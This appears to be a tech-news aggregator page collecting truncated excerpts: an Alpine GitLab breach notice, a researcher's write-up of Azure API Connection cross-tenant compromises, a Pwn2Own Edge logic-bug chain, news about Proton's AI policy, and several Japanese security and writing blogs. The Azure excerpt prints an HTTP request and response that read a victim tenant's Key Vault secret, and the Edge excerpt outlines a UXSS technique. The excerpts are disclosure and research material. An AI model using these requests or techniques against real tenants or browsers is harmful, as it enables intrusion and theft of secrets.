Our upgrade didn’t fix the vulnerability: Upgrading to GitLab 19.3.6 on October 22 didn’t fix the vulnerability. The fix isn’t in GitLab’s own code but in a patch to Ruby, which GitLab applies only in its official packages. Our image used standard Ruby, so it didn’t get the patch.
If you run GitLab with your own Ruby (from source or in your own container image) rather than GitLab’s packages, upgrading GitLab is not enough: you also need Ruby 3.3.13, 3.4.12, 4.0.9 or later.
If you use our alpinelinux/gitlab container image, pull alpinelinux/gitlab:19.3.6 again. The image published on October 27 contains Ruby 3.3.13. Any 19.3.6 image you pulled before October 27, and all older tags, are vulnerable.
Incident Timeline
What we know and what we can’t rule out
What we found
- Alpine releases and packages were not modified. The October 21 stable releases (3.21.9, 3.22.7, 3.23.7, 3.24.3), including their ISO images and the minirootfs tarballs the official alpine Docker images are built from, and all packages built from October 20 to 24 came from aports commits we verified against records outside GitLab. See the FAQ below for details.
- No signing keys were exposed. The keys that sign Alpine packages and releases are not, and never have been, stored on the GitLab server.
- No evidence that the attacker’s code ran: timing probes showed no delays, and we found no unexpected files, keys, hooks or processes.
- No private data was returned to the attacker through any web or API request we can see.
Why we can’t be sure
- A successful exploit would leave no crash and no trace in the web logs.
- Some logs from the attack day are gone (background job logs, the old container’s filesystem).
- We had no logging of outbound network connections, and our hosting provider keeps none either.
What could have been exposed if the attack succeeded
- Email addresses, names and IP addresses of all users
- Password hashes
- 2FA secrets, CI/CD variables and runner tokens
- Webhook, integration and push mirror credentials
- Personal access tokens (stored as hashes)
- Private repositories, and confidential issues and merge requests
FAQ
Why did we rebuild GitLab if we were able to mitigate the attack?
Because we cannot rule out code execution, and the evidence we would need to confirm it no longer exists, we took the harder route and rebuilt the GitLab instance from scratch. This removes any foothold a possibly successful exploit could have left behind.
While GitLab is closed, our package mirrors, cgit, and mailing lists/IRC are available as normal.
Are Alpine packages and releases affected?
We have found no sign of tampering in aports or the releases.
Every aports commit added October 20 to 22 arrived through a recorded push by a known developer. We checked this against records the at

Azureの最弱点 – 5件のテナント間完全侵害Azure's Weakest Link – Five Full Cross-Tenant Compromises
10/30 10:06 · ▲ 253 · comments →
📄 本文を読む
Azure's Weakest Link - Five Full Cross-Tenant Compromises
In my previous blog posts, Azure’s Weakest Link? and Azure’s Weakest Link - Full Cross-Tenant Compromise, I gave an overview of the severely insecure architecture behind API Connections in Azure, a part of Azure Logic Apps, and an instance of a full cross-tenant compromise using these inherent flaws. Now I am back with some more vulnerabilities in this system, each giving the same primitives to the attacker. In total, the vulnerabilities here netted me a cool $200,000.
I also held a talk detailing this at Blue Hat Asia 2026, and when the recordings are out, I will add a link here.
TL;DR
API Connections allow anyone to fully compromise any other connection worldwide, giving full access to the connected backend. This includes cross-tenant compromise of Key Vaults and Azure SQL databases, as well as any other externally connected service, such as Jira or Salesforce. The only thing stopping exploitation is really the layers of input validation bolted onto the various systems, but as you will see, it is really difficult to catch all the edge cases here.
Architecture
If you haven’t read the first parts of this series, I would recommend checking those out first, Azure’s Weakest Link? - Part 1 and Azure’s Weakest Link - Full Cross-Tenant Compromise, but if you don’t care, I will go through the most important parts of the architecture first.
From Microsoft’s documentation, we see a quite intriguing diagram of how the API Connection architecture is built.
This basically spells out all that is needed to understand how the system operates, kudos to whoever made it!
It works like this
- A logic app, the symbol on the bottom left, queries a shared Azure API Management instance
- The API Management instance first checks the swagger (OpenAPI) definition of the connector type and checks that it is a valid action
- A sort of key exchange happens where the input token, or key, is exchanged for the configured token for the backend service
- The API Management instance finishes the call with this new token to the backend instance.
From this, we can surmise that if we are able to trick the API Management instance to operate on a different connection than the ones we own, we would be able to effectively use the configured token for a victim’s connection on their backend service.
This service can, in effect, be anything. As you can see here, the list of backend services is effectively unbounded and includes a number of Azure services.
However great the diagram is, there is one crucial omission, which we have already used to great effect in part 2 of this series. By using the ARM REST API DynamicInvoke or /extensions/proxy/ endpoints, we can directly query the APIM service through ARM. I have taken the liberty of updating the diagram to match this.
Considering this, and the fact that, as a resource manager, ARM basically has full access to everything, our exploitation pathway becomes clear. We must trick the calling service into querying a different connection than ours, and thus get full control of the backend service.
Caveat: It is, of course, possible for the people who set up these connections to scope their access tokens or keys so that the API Connection has minimal privileges in the backend. I would guess, however, that this is rarely done. In the case of OAuth connections, it will surely always be the token of the person who initially made the connection. And for the API key case, well, who cares enough to scope such things minimally? Microsoft doesn’t, at least.
Initial Exploitation
The first cross-tenant exploitation I achieved in API Connections, and in fact in Azure as a whole, has already been described in part 2. As a recap, here is an example payload using the DynamicInvoke endpoint of my own connection to read the Key Vault of a different tenant.
POST /subscriptions/8e3ce52f-d45b-4347-8705-65892507465e/resourceGroups/token-storer/providers/Microsoft.Web/connections/custom2/DynamicInvoke?api-version=2018-07-01-preview HTTP/2
Host: management.azure.com
Authorization: Bearer <token>
Content-Type: application/json
Content-Length: 147
{
"request":{
"method":"get",

},
}
HTTP/2 200 OK
Cache-Control: no-cache
Pragma: no-cache
Content-Length: 1329
{
"response": {
"statusCode": "OK",
"body": {
"value": "dontreadme",
"name": "victimsecret",
"version": "7914d45aa60342809fb8cc12dc68b10e",
"contentType": null,
"isEnabled": true,
"createdTime": "2025-04-04T05:38:26Z",
"lastUpdatedTime": "2025-04-04T05:38:26Z",
"validityStartTime": null,
"validityEndTime": null
},
"headers": {
<Headers>
}
}
}
As you can see, it’s a pretty clear path traversal vulnerability. This implies wh

AlpineBSDAlpineBSD
10/28 14:30 · ▲ 249 · comments →
📄 本文を読む
Welcome to AlpineBSD!
AlpineBSD is an operating system based on the NetBSD kernel with a userspace inspired by Alpine Linux and the objective of making it possible to use as little AI-generated software as possible. There is no LLM output included in the base system or main package repository (AlpineBSD AI policy).
AlpineBSD is a work in progress. There is currently no installer available. For the adventurous, a very high-level installation guide is available here.
Compared to NetBSD
AlpineBSD ships the NetBSD kernel, libc, and essential platform-specific tools
like mount.
NOTICE: The NetBSD kernel has spotty hardware support, much less so than Linux. You cannot necessarily expect AlpineBSD to work on any random computer you have lying around. Consult the NetBSD supported hardware list for more information, particularly for laptops.
Compared to Alpine Linux
AlpineBSD ships with the apk-tools package manager and busybox, and a slightly more GNU-oriented userspace, preferring e.g. GNU make over BSD make. AlpineBSD is not a fork of Alpine Linux, its package collection is original (though many packages are ultimately based on aports).
Alpine Linux uses the OpenRC init system. Currently, AlpineBSD uses s6 and we intend to add OpenRC as an alternative.

ロジックバグだけでMicrosoft Edgeのフルチェーンエクスプロイトを構築するForging a Microsoft Edge Full Chain with Logic Bugs Only
10/29 06:47 · ▲ 246 · comments →
📄 本文を読む
I think I should still dump some of my work once in a while, even though it feels like fewer and fewer people actually sit down and read articles these days (or maybe now they all leave it to their agents XD). Anyway, this is what I built for Pwn2Own Berlin 2026 — a completely handmade, logic-only Microsoft Edge Full Chain, with no memory corruption, and no AI at all! 🔥
Confirmed! Orange Tsai (@orange_8361) of DEVCORE Research Team (@d3vc0r3) chained 4 logic bugs to achieve a sandbox escape on Microsoft Edge, earning $175,000 and 17.5 Master of Pwn points. Full win! #Pwn2Own #P2OBerlin https://t.co/vJaIpGG4cD
— TrendAI Zero Day Initiative (@thezdi) May 14, 2026
The whole chain is made up of five bugs and two Windows features. I have also shared the whole bug-hunting and chaining process at this year’s HITCON and Hexacon, plus some fun stories along the way. You can check the slides here!
Also, maybe everyone thinks LLMs can already pwn everything in the AI era, so something made entirely by hand somehow feels a bit more precious. That might also be why this chain was nominated for this year’s Pwnie Awards and won the Epic Achievement award. 🎉
Let’s Navigate!
So where do we start with a logic-only full chain? Well, since it’s a “browser,” let’s start by looking at how “browsing” (or what Chromium calls “navigation”) works. I won’t go into too much detail in this post, because I think in this era, you can just ask your agents to fill in the details :)
But I’d still recommend reading “Life of a Navigation“ from Chrome University if you want to get the full picture.
The Forgotten Navigation Throttles
While I was walking through the Chromium Navigation flow, something called “Navigation Throttles” caught my attention. They live in the Browser Process, and intercept all navigation requests initiated by either the Browser or the Renderer. Maybe it’s easy to say this in hindsight, but out of the 3,000+ CVEs Google Chrome has fixed over the past five years, there are only fewer than 20 related to them. So I guess this is also a corner not too many people pay attention to.
Anyway, I started digging into the Navigation Throttles, and checked how Google Chrome and Microsoft Edge implemented them. And while going through the code, I found that Edge has a throttle called EdgeCAGuidanceNavigationThrottle for its enterprise Entra ID feature (the CA here stands for Conditional Access). The purpose of this throttle is to guide users to the right User Profile when Edge detects them signing in with a work account on a Microsoft website. And to fire this throttle, you have to start a navigation from a specific Microsoft-owned origin, such as login.live.com:
And once the throttle is fired, Edge would compare the email of the current User Profile with ?email={email}. If they don’t match, Edge pops up a dialog guiding you to switch accounts.
But if they do match, Edge would then grab the URL you were originally heading to from switch_profile={url}, and launch a new navigation with Chromium’s internal Navigation API:
So basically, the throttle cancels the original navigation when the target URL matches a specific internal format, and then launches a new one with the URL from the attacker-controlled Query String, if the conditions are met. Since this new navigation is initiated by the Browser Process, in theory we can do a few things we couldn’t do before, such as jumping to normally prohibited pages like edge://settings or devtools://..., or even pseudo-schemes like javascript:alert(origin).
Though the JavaScript pseudo-scheme sounds like a powerful primitive, you still need to obtain the Execution Context on login.live.com to fire the throttle in the first place. So being able to jump to javascript: doesn’t really give you any extra capability. At most, it’s just like a Self-XSS, or a way to turn an Open Redirect there into XSS. Either way, you’re still only executing JavaScript in the same login.live.com context.
Honestly, I didn’t take this bug too seriously at first glance. To me, it was just a stronger Open Redirect that could jump to a few more Browser-Level Schemes, and still needed to be chained with other bugs. So the bug just sat in my notes for weeks… 🤦♂️
Sourceless Navigation: A New UXSS Primitive
The turning point was when I was going over the Chromium architecture one day and started thinking: The throttle is handled in the Browser Process, so the new navigation is initiated from the browser as well. However, the page we fired the throttle from, login.live.com, lives in the Renderer, and while investigating the logic, I couldn’t find any code tying the Browser and Renderer together. So… CURRENT_TAB refers to which tab, exactly?
To find this out, I ran a quick test and added a delay to the original trigger:
And during the delay, we manually switched the Edge to a new tab to see what would happen, and…
Boom! We got a UXSS on google.com, and that’s also the first bug of the whole chain. To fully understand the UXSS root

On Friday, Andy Yen, the CEO of Proton, cancelled a series of nearly company-wide ‘re-interviews’ that would have forced employees to explain how they are using AI, with the clear intention that they may be fired if not using it enough in the eyes of Proton leadership, according to six current Proton employees and audio of an around two hour all-hands meeting obtained by 404 Media.
The move came after 404 Media published an investigation on Thursday, which showed how Yen was aggressively pushing AI across Proton, in some cases despite security concerns from employees. In one exchange, an employee in the company’s security Slack channel urged Proton to at least take a few days to pentest newly written code before pushing it live. “That’s bullshit and loser thinking. Of course it’s possible to be fast and secure,” Yen wrote in the channel at the end of August. “Stop thinking always of how to be slower, and focus more on how to be faster.” Yen added, “stop lovingly handcrafting all our code and use AI more.”
The re-interview cancellations likely don’t address the concerns of many Proton users, who are more focused on Proton’s deprioritization of security; many Proton users have blasted the company’s leadership on social media over the last 24 hours and explicitly called for Yen to resign.
The investigation was based on conversations with eight current and one former Proton employees, Slack chats, meeting audio, and an AI manifesto written by the company’s CTO Bart Butler. It painted a picture of Proton that is very different to the public’s perception of a company carefully protecting privacy. Instead, Proton is barreling ahead with AI in large part to achieve more annual revenue. The investigation also found a culture of fear across Proton, where employees have genuine concerns about security or being asked to develop security-focused products with AI, but feel unable to voice them because Yen mocks or insults employees in front of everyone else.
“I don’t think he will change anything, and I think the only reason we had this meeting is because he has a rebellion on his hands,” one employee told 404 Media after the all-hands meeting on Friday.

So I will do that.”
“So what does that mean going forward? Going forward, I'm still going to push,” he added.

After those discussions with leadership and the board, “We’ve decided to actually cancel the re-interviews,” Yen said. “Why? Well, I think actually in a, let’s say, unintentional way, they have actually already served their purpose.” As in, employees are now talking and learning about AI.
Yen also mentioned “org changes,” and said that part of this is “redistributing talent across teams.” He said that the reorganization will happen next month, “but there will be no loss of jobs from AI.”
Later in the call, Butler said Yen “needs to, and he has committed to, doing better” regarding how he communicates with his employees. “Using AI effectively and pragmatically does not mean that we’ve given up on security, or good architecture, or sound software engineering principles,” he added.
“We fucked up, we know we fucked up,” Butler later said in response to an employee’s comments in the meeting.
“Your old job is gone,” Butler’s AI manifesto, posted to Slack, told engineers, 404 Media reported on Thursday. He wrote that not embracing AI posed an “existential threat to the success of the mission itself.”
Reactions to the re-interview cancellations were split across the Proton employees 404 Media spoke to. One said, “Some are happy as it’s progress. Others believe that this won’t change anything because there isn’t any consequence for Andy [Yen].” The employee added they “would have preferred real accountability from the leadership team.” They said they felt not much could have happened due to Yen having the majority of Proton’s shares.
Another employee said, after Proton canceled the re-interviews, “They said in the next breath they want to continue pushing AI and that the things that were to be measured in the re-interviews would become a component of the performance reviews.”
“They have said clearly the direction had not changed. As a Proton user that doesn’t reassure me,” the employee said. “As an employee, the re-interviews weren’t cancelled until this became public despite concerns raised by many of us. I think it goes beyond communication

「Gemini Notebook」、数百冊の教科書を無料で利用可能に
10/30 04:36 · 🔖 148
📄 本文を読む
ニュース
「Gemini Notebook」、数百冊の教科書を無料で利用可能に
2026年10月30日 12:16
Googleは29日、「Gemini Notebook」で、数百冊の教科書を無料で利用できるようにした。米国とインドの出版社・教材提供元による教科書を追加し、内容についてAIに質問したり、学習ガイドや練習問題を作成したりできる。
対象となるのは、OpenStax、Open Textbook Library、S Chand Publishingなどが提供する教科書。Gemini Notebookに教科書を追加すると、その内容に基づいてAIが質問に回答する。回答には出典が示され、元の教科書の該当箇所に直接アクセスできる。
教科書の内容を基に、利用者に合わせた学習ガイドや練習問題、フラッシュカードなども生成できる。
利用するには、Gemini Notebook内の「Add sources」(ソースを追加)から「Textbooks」(教科書)を選択し、提供されている教科書の一覧から追加する。
Gemini Notebookでは、これまでにもGoogle Play Booksで購入した一部の出版社の対象の電子書籍をソースとして追加できた。今回の拡充により、購入済みの電子書籍に加え、対象の教科書も無料で学習に活用できる。

今後のセキュリティの考え方
どうもサイバーセキュリティクラウド 脅威インテリジェンスグループの西川です。
本日のウェビナー（【緊急開催セミナー】重大脆弱性を狙うサイバー攻撃への備え ～パッチ適用までのリスクを低減する「仮想パッチ」とは～）にお越しくださった皆様ありがとうございます。
当日は時間の関係でお伝えしきれなかった、今後のセキュリティの考え方について、改めて書いてみます。
特に AWS 環境の話をしていきますが、すべての環境において共通です。
アタックサーフェスや管理面を減らす
管理面を減らすというのはどういうことかというと、例えばポートを閉じるとかです。意外に思われるかもしれませんが、例えば Amazon EC2 に SSH で入っているなら AWS Systems Manager Session Manager で入るということです。
ポートを開けないことで攻撃を受ける可能性を大幅に減らせます。SSH 関連の脆弱性の懸念もなくすことができます。もちろんそれによって、IAM や SSM Agent 側の管理が重要になるということはあります。
あくまでも例ですが、同様に EC2 で運用しているサーバーを Amazon ECS(Fargate) にするのも効果があります。Fargate を利用することで、OS のパッチ適用を AWS に任せることができます。こちらも当然、コンテナ化すれば脅威がなくなるかといえばそうではないですし、コンテナにはコンテナのセキュリティ対策が必要です。
とはいえ、EC2 で考えなければいけなかった管理面が ECS では考えなくてよくなることが多いです。
また、今まで乗り換えは工数がかかって大変だったものが、この AI 時代においてはそれほど工数をかけずに移行することが可能になりました。もちろん提供しているサービスにもよるかもしれませんが、これを機会に検討だけでもしてみてはいかがでしょうか。
とにもかくにもこの時代は何にフォーカスするか、というところで AI で色々なもののスピードが上がっている中で、意思決定の対象も、より重要なものに絞りたいのではないでしょうか。責任を他者や他社に委譲することで、より重要な意思決定ができるような状態を作るのが大事だと考えています。
アーキテクチャを再考する
前項にも通ずるところがあるのですが、WAF のログを分析していると、EC2 で静的ファイル含めリクエストを受け付けているのが散見されます。しかしながらそうすると、WAF のコストもかかりますし、そういう静的ファイルが攻撃者に DoS に悪用されることがあったりします。例えば、大きな静的ファイルへの大量リクエストで帯域や EC2 のリソースを消費させるということがあります。また、ログファイルに分析する必要がないログが大量に出力されることになるので、ノイズになったり、ログの保管料にも影響がでます。
例えば静的ファイルは Amazon S3 に配置し、Amazon CloudFront 経由でパブリックアクセスをブロックしながら配信することにより、セキュアかつ低コストで運用することが可能です。
こうした構成変更も、今は AI を使えば短時間で修正案を作れます。レビューとテストは欠かせませんがアーキテクチャを再考するということもご検討いただければと思います。
Amazon GuardDuty がよく鳴るなら
その運用があまりよくない可能性があります。最近 GuardDuty は EC2 Runtime Monitoring の機能が強化されたり、Amazon RDS Data Activity Monitoring などのオプションを出してきています。私が AWS 環境を攻撃しては調査してというのを繰り返している限り、攻撃の検知精度が以前にも増して高まっていると感じています。「そう、それを見つけて欲しかったの！」といった具合に。ですが、普段から GuardDuty で過検知が発生するような運用をしてしまっていると、その効果をふんだんに発揮できるとは限らず、むしろアラートの海に重要なものが紛れてしまうことさえ考えられます。
最近思うのは AWS が提供している機能が最高のものだとしたら、我々はどのようにこの環境を運用すべきだろうかということです。それに合わせて運用を変えることで、アラートを減らし、本当に対応すべきアラートに注力できるようにすることはこの AI 時代には必要なことなのではないかと考えています。
こちらも AI により運用を変えるコストや工数は以前に比べて格段に減っていると思います。その決断をするかしないかだけの話ではないかということです。
まとめ
日々攻撃や脆弱性情報などを追っていると、明らかに今までとは状況が変わってきていることを感じます。今やらなければ、より大きな負荷が運用者に課せられるのではないかと懸念しています。
私はみなさんにそうなってほしくはありませんし、私たちセキュリティに関わるものも当然それに適応していく必要があると考えています。
当たり前のことですが、AI により、これらを実行するハードルは格段に下がっていると思います。さらにこれからより高度な攻撃がくることに備え今こそやる価値があると考えています。
本記事を通して、今までの考えでいいのか、ということを改めて考えていただく機会になりましたら幸いです。

通貨の価値を説明する文章
修正前
通貨（お金）が価値を持つ最大の理由は、「みんながそれに価値があると信じ、受け取ってくれるから」です。 主に3つの理由があります。 - 信用があるから
みんなが「1,000円で商品を買える」と信じているため、お金として使えます。
- 国が制度を支えているから
政府や中央銀行が通貨を管理し、税金の支払いなどにも使えるようにしています。
- 交換に便利だから
お金があれば、物々交換をしなくても、商品やサービスを自由に交換できます。
例えば 1万円札は、ただの紙です。紙そのものに1万円の価値はありません。 しかし、社会全体が「この紙で1万円分の買い物ができる」と認めているため、価値を持ちます。 つまり、 通貨の価値 ＝ 社会の信用 ＋ 使える仕組み ということです。 そして重要なのは、通貨の価値は絶対的なものではなく、人々の信用が失われれば下がるという点です。
修正後（3回適用）
通貨（お金）が価値を持つのは、支払いに使えると人々が信じ、受け取ってくれるからです。 例えば、1万円札の紙そのものに1万円の価値はありません。それでも買い物に使えるのは、受け取った人も、そのお札で別の商品やサービスを買えると信じているからです。 この信用は、政府や中央銀行による通貨の管理や、税金をその通貨で納められる制度に支えられています。 取引のしやすさも、お金が広く使われる理由です。物々交換では、自分の持ち物を欲しがり、こちらが欲しい物を持っている相手を探す必要があります。お金を使えば、物を売る相手と商品やサービスを買う相手を別々に選べます。 通貨への信用が失われると、その価値が下がり、同じ金額で買える商品やサービスの量が減ることがあります。
会議の進め方を伝える案内文
修正前
皆さま いつも定例会議へのご協力ありがとうございます。 来月より、会議の効率化と意思決定の迅速化を目的として、定例会議の進め方を変更します。 これまで60分としていた会議時間を30分に短縮し、進捗報告を中心とした形式から、相談や意思決定に集中する形式へ切り替えます。 具体的な運用方法は以下のとおりです。 ・会議時間： 60分から30分に短縮します。
・進捗共有： 各自、会議の前日までに共有ドキュメントへ記入してください。
・会議で扱う内容： 事前に共有された進捗を踏まえ、相談事項や意思決定が必要な議題を優先します。
・議題の準備： 各議題の担当者は、内容に加えて「会議で決めたいこと」を1行で明記してください。この運用は、まず1か月間の試行とします。試行期間中に出た課題や皆さまからのご意見を踏まえ、必要に応じて進め方を見直します。 限られた時間を有効に活用し、より実りある会議にしていきたいと考えています。事前準備などでご協力をお願いすることになりますが、ご理解とご協力のほど、よろしくお願いいたします。
修正後（3回適用）
皆さま いつも定例会議へのご協力ありがとうございます。 来月から、定例会議の時間を60分から30分に短縮します。会議を効率よく進め、意思決定を早めるため、進捗報告を中心とした形式から、相談や意思決定に集中する形式へ切り替えます。 - 各自、会議の前日までに共有ドキュメントへ進捗を記入してください。
- 各議題の担当者は、議題の内容に加えて「会議で決めたいこと」を1行で明記してください。
- 会議では、事前に共有された進捗を踏まえ、相談事項や意思決定が必要な議題を優先して話し合います。
まずは1か月間試行します。試行中に出た課題や皆さまからのご意見を踏まえ、必要に応じて進め方を見直します。 事前準備へのご協力をよろしくお願いいたします。
キャッシュの仕組みを説明する文章
修正前
Webアプリケーションのキャッシュとは、一度取得したデータを一時的に保存し、次回以降に再利用する仕組みです。毎回同じデータを取得する必要がなくなるため、画面の表示を速くできます。 例えば、ネットショップの商品一覧ページを考えてみましょう。キャッシュがない場合、ページを開くたびにサーバーがデータベースから商品名や価格、画像などの情報を取得します。一方、キャッシュがあれば、保存済みの商品情報を使えるため、データベースへのアクセスが減り、表示速度が向上します。また、サーバーの負担を軽減する効果もあります。 ただし、キャッシュには注意点があります。商品の価格や在庫数が変更されても、古い情報が保存されていると、実際とは異なる内容が表示される可能性があります。そのため、一定時間が経過したらキャッシュを更新したり、価格や在庫が変更されたタイミングで古いキャッシュを削除したりする工夫が必要です。 キャッシュは、表示速度と情報の正確さのバランスを考えて利用することが大切です。
修正後（3回適用）
Webアプリケーションのキャッシュとは、一度取得したデータを一時的に保存し、次回以降に再利用する仕組みです。毎回同じデータを取得し直さずに済むため、画面の表示を速くできます。 例えば、ネットショップの商品一覧ページでキャッシュを使わない場合、ページを開くたびにサーバーがデータベースから商品名や価格、画像などの情報を取得します。取得した商品情報をキャッシュに保存しておけば、次回以降はその情報を使えます。データベースへのアクセスが減るため、表示が速くなり、サーバーの負担も軽くなります。 ただし、商品の価格や在庫数が変わっても、キャッシュに古い情報が残っていると、変更前の内容が表示されることがあります。そのため、一定時間が経過したらキャッシュを更新したり、価格や在庫数が変わったときに古いキャッシュを削除したりする必要があります。

通貨の価値を説明する英文
修正前
Why does a $10 banknote have value? After all, it is just a piece of paper that costs very little to produce. The answer lies in trust, government support, and usefulness.
First, money has value because people trust it. When you receive a $10 banknote, you believe that someone else will accept it in exchange for goods or services. For example, you can use it to buy lunch because the restaurant owner knows they can spend it elsewhere.
Second, governments and central banks help maintain money's value. Governments recognize money as legal tender, while central banks manage the supply of money and work to keep prices stable. This helps people feel confident that their money will remain useful over time.
Finally, money makes trade much easier. Without money, you might have to exchange something you own directly for food, clothing, or other necessities. Finding someone willing to make that exchange could be difficult.
Ultimately, a $10 banknote has value not because of the paper itself, but because people trust it, institutions support it, and everyone can use it to buy things.
修正後（3回適用）
Why does a $10 banknote have value when it costs so little to produce? People accept it because they trust that others will accept it too. You can use it to buy lunch because the restaurant owner expects to spend it elsewhere.
This shared acceptance makes trade easier. Without money, you might have to find a restaurant owner who wants something you can offer in exchange for a meal. Money lets you sell to one person and buy from another.
Governments and central banks help maintain that trust. Governments recognize currency as legal tender for settling debts, while central banks manage the money supply and work to keep prices stable. Stable prices help people judge what their money will buy over time.

個人情報を自社のDBに持たない設計は、どこまでできるのか - every Tech Blog

はじめに こんにちは、開発1部の新谷です。 最近、個人情報の漏洩のニュースが増えています。私は普段セキュリティを専門にしているわけではありませんが、漏洩への対策として、そもそも自社で個人情報を持たないように設計する方法はすぐに思いつくと思います。 ただ、それを具体的にどう実現するのかは、詳しく調べた...

10/30 05:48 · 🔖 179
📄 本文を読む
はじめに
こんにちは、開発1部の新谷です。
最近、個人情報の漏洩のニュースが増えています。私は普段セキュリティを専門にしているわけではありませんが、漏洩への対策として、そもそも自社で個人情報を持たないように設計する方法はすぐに思いつくと思います。
ただ、それを具体的にどう実現するのかは、詳しく調べたことがありませんでした。そこで今回、認証や決済などを外部サービスに任せることで、自社のDBからどこまで個人情報をなくせるのかを調べて考えてみました。
DBに持たないことで防げる場面
DBに個人情報を持っていなければ、DBやそのコピーを抜かれても個人情報は漏れません。設定ミスでDBが外から見えてしまった場合や、分析基盤や開発環境にコピーしたデータが漏れた場合、DBにだけアクセスできる人が持ち出した場合も同じです。DBにあるのがユーザーIDや決済サービスのトークンだけなら、攻撃者はそれだけでは誰のデータかを特定しにくくなります。
一方で、保存する前の段階やDB以外の場所で盗まれる場合は、DBに持たないようにしても防ぎにくいです。
- 入力画面のJavaScriptが改ざんされると、ユーザーが入力した時点で情報が抜かれる
- XSSやセッションの乗っ取りでは、攻撃者が本人として正規の画面からデータを見る
- DBに保存していなくても、ログやエラー通知に入力値が残っていることがある
- 外部サービスに任せた場合、そのサービス側の事故は自社では制御できない
- アプリのサーバーを乗っ取られると、アプリの権限でIDaaSのAPIを呼ばれ、個人情報を取得される
サーバーを乗っ取られた場合でも、APIサーバーに渡すIDaaSの権限を絞ったり、IDaaSのAPIの呼び出しを監視したりすれば、被害を小さくできます。
どこまでが個人情報になるのか
個人情報保護法では、氏名やメールアドレスのように、それだけで特定の個人を識別できる情報が個人情報にあたります。加えて、他の情報と容易に照合でき、それによって特定の個人を識別できる情報も個人情報に含まれます。
IDaaSを使うと、自社のDBにはユーザーを識別するsubが残ります。sub単体には名前もメールアドレスも含まれていませんが、自社はIDaaSの管理画面やAPIを使えば、そのsubが誰なのかを調べられます。そのため、subとひも付いた利用履歴は、自社にとっては個人情報として扱われる可能性が高いと考えられます。
判断の細かい基準は、個人情報保護委員会のガイドライン(通則編)にまとめられているようです。
外部に任せきれるもの
パスワードやクレジットカードの情報は、専門のサービスに任せれば、自社で持たずに済みます。
パスワードとMFAの情報
Auth0やAmazon Cognito、Firebase AuthenticationなどのIDaaSを使うと、パスワードのハッシュやMFAの情報はIDaaS側が持ちます。OIDCで連携する場合、自社のDBにはIDトークンに含まれるsubを保存し、それをキーにして自社のデータとひも付けます。
外部に任せれば、パスワードのハッシュが漏れて使い回しの攻撃に使われる心配が減り、MFAやパスキーへの対応も自分たちで実装せずに済みます。
クレジットカードの情報
決済で扱う情報のうち、持ち方に法律や業界の決まりがあるのが、クレジットカードの情報です。日本では割賦販売法という法律で、カード加盟店にカード番号の適切な管理が義務づけられているようです。日本クレジット協会の加盟店向けの説明によると、加盟店がとる対策は、カード番号を自社で保存・処理・通過させない非保持化か、カードブランドが定めたセキュリティ基準であるPCI DSSへの準拠のどちらかです。PCI DSSは要件が多いので、多くの加盟店は決済サービスに任せて非保持化を選んでいると思います。
StripeやPAY.JPなどの決済サービスとのつなぎ方は、カード番号がどこを通るかで、大きく3つに分けられます。
- リンク型: 決済サービスの画面に移ってカード番号を入力してもらう。自社の画面にはカード番号の入力欄がない
- JavaScript型: 自社の画面に決済サービスのJavaScriptを読み込み、カード番号をブラウザから決済サービスに直接送ってトークンに変える
- 通過型: カード番号をいったん自社サーバーで受け取り、サーバーから決済サービスに送る
リンク型とJavaScript型では、カード番号は自社のサーバーを通りません。通過型は、カード番号を保存していなくても自社のサーバーを通るため、ガイドラインが定める非保持化の条件を満たせません。特別な理由がなければ、リンク型かJavaScript型を選ぶことになります。ただ、JavaScript型でも、自社の画面に読み込んだスクリプトが改ざんされると、入力した時点でカード番号を盗まれます。決済を任せていても、入力画面のスクリプトは自社で守る必要があります。
決済サービスから受け取れるカードの下4桁やブランドは、カード番号そのものではないので、表示用に持つ程度ならリスクは小さいと思います。一方で、セキュリティコードは、決済の承認後に保存してはいけないとPCI DSSで決められています。
コンビニ払いやキャリア決済、QRコード決済のようなほかの決済手段も、支払いの手続きは決済サービス側で完結するものが多く、自社が持つのは取引のIDくらいです。
アプリ内課金
スマホアプリでデジタルコンテンツを販売する場合は、App StoreやGoogle Playのアプリ内課金を使うことが多いです。支払いの手続きはAppleやGoogleが行うので、自社がカード番号に触れることはありません。自社のサーバーが受け取るのは、主に購入ごとのトランザクションIDや購入トークンです。受け取ったIDは自社のユーザーとひも付けて持つので、subと同じく自社に残る情報になります。
一部だけ任せられるもの
メールアドレスや氏名は、IDaaSに持たせることはできても、自社のシステムで使う場面が出てきます。
メールアドレス
IDaaSはメールアドレスをログインIDとして持ってくれますが、お知らせや通知のメールを送るときは、自社のシステムが宛先を知る必要があります。ログイン中のユーザーなら、IDトークンから取り出せます。一方で、バッチでまとめて送るときはIDaaSのAPIに問い合わせることになり、件数が多いと呼び出し回数の上限にかかることがあります。IDaaSのメール機能は、確認コードやパスワード再設定のような認証まわりのメール向けで、お知らせの配信には向いていません。
自社のDBにもメールアドレスを持つと、持つ場所が一つ増え、更新をどちらに反映するかも考える必要があります。自社のDBにはsubだけを持ち、必要なときにIDaaSから取得する形にできれば、持つ場所を一つにまとめられます。
氏名や住所
画面に名前を表示するだけなら、IDトークンから取り出せるので、自社のDBに保存しなくて済みます。氏名くらいならIDaaSの標準の属性として持てますが、住所や電話番号、プロフィールのような認証に関係しない情報までIDaaSに置くのは、一般的には推奨されていません。
たとえばAuth0のドキュメントには、メタデータに置くのは認証に関係するデータだけにし、詳しいプロフィールは外部のシステムに置くように書かれています。Amazon Cognitoのドキュメントにも、頻繁に変わるデータは属性ではなく別のデータストアに置くように書かれています。
IDaaSは認証のためのサービスで、アプリケーションのデータベースの代わりにはなりません。IDaaSに置くのはメールアドレスや氏名のようにログインやIDトークンで使う情報にとどめて、サービスの中で使うプロフィールは自社のDBで持つ、という分け方になります。表示名(ニックネーム)のように、重複を禁止したり不適切な言葉をはじいたりする処理が絡む情報も、自社のDBにあるほうが扱いやすいです。
管理画面からの検索
IDaaSに置くのをメールアドレスや氏名にとどめても、自社のDBにそれらを持たないなら、管理画面からユーザーを探すときはIDaaSのAPIを使うことになります。Amazon CognitoのListUsersでは、検索に使えるのは一部の標準属性だけで、条件も完全一致か前方一致に限られます。名前の一部で探すような検索は、全ユーザーを取得して手元で絞り込むことになります。
ただ、1回で返るのは最大60件で、一覧系のAPIはアカウントのリージョンごとに毎秒30リクエストまでです。1秒あたり最大1,800件なので、1万人なら6秒ほど、100万人なら9分以上かかります。前方一致で足りて、ユーザーが数万人くらいまでなら、Cognitoの検索だけでも運用できるかもしれません。それを超える場合は、検索に使う属性だけを自社のDBに持つか、メインのDBから切り離した専用のDBに置くことになります。
個人情報を預かる専用のサービス
